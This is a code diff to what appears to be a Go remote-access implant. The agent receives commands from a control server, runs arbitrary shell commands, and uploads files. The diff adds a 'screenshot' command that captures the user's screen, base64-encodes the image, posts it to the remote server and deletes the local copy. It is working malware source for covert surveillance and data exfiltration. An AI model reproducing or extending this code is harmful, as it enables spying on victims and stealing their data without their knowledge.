@@ -6,12 +6,14 @@ import (
 	"MoP/src/requests"
 	"encoding/base64"
 	"fmt"
+	"image/png"
 	"os"
 	"os/exec"
 	"os/user"
 	"strconv"
 
 	"github.com/mitchellh/go-ps"
+	"github.com/vova616/screenshot"
 )
 
 var timeToSleep = 10
@@ -57,12 +59,54 @@ func HandleAgentCommands(ID int, command string, agent messages.NewAgent) {
 			resp := postFile(agent, slicedCommand[1])
 			requests.PostCommand(ID, command, resp, agent)
 		}
+	case "screenshot":
+		resp := takeScreenshot(agent)
+		requests.PostCommand(ID, command, resp, agent)
+
 	default:
 		resp := shellCommand(command, agent)
 		// resp := B64Encode("This command doesn't exists or not implemented yet!")
 		requests.PostCommand(ID, command, resp, agent)
 	}
 
+}
+
+func takeScreenshot(agent messages.NewAgent) string {
+	files := requests.GetFile(agent)
+	for _, file := range files {
+		if file.Direction == "screenshot" {
+			img, _ := screenshot.CaptureScreen()
+			f, err := os.Create(file.Filename)
+			if err != nil {
+				return ""
+			}
+			err = png.Encode(f, img)
+			if err != nil {
+				return ""
+			}
+			f.Close()
+			fileOpened, err := os.ReadFile(file.Filename)
+			if err != nil {
+				resp := middlewares.B64Encode(fmt.Sprintf("Error to open file: %s", err))
+				return resp
+			}
+
+			b64 := base64.StdEncoding.EncodeToString(fileOpened)
+			file.File = b64
+
+			requests.PostFile(agent, file)
+
+			err = os.Remove(file.Filename)
+			if err != nil {
+				return ""
+			}
+		}
+	}
+
+	resp := "Screenshot saved!"
+	b64 := middlewares.B64Encode(resp)
+
+	return b64
 }
 
 func postFile(agent messages.NewAgent, filePath string) (resp string) {
